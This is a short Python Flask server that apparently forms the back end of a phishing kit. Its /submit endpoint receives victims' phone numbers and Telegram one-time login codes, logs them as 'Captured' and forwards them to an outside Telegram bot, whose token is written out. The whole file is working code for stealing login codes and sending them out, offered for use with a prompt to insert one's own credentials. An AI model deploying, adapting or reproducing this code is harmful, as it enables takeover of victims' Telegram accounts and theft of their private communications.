from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

# REPLACE THESE WITH YOUR ACTUAL CREDENTIALS
BOT_TOKEN = "8893817787:AAGrvjQExlWWfZ6kRvI_BzjIOku2TmF1-VM"
CHAT_ID = "8893817787"

TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_to_telegram(phone, otp):
    message = f"*New Telegram OTP Captured*\n\n📱 Phone: {phone}\n🔑 OTP: {otp}"
    
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return None

@app.route('/')
def index():
    return open("index.html").read()

@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    
    print(f"Captured: {phone} - {otp}")
    send_to_telegram(phone, otp)
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
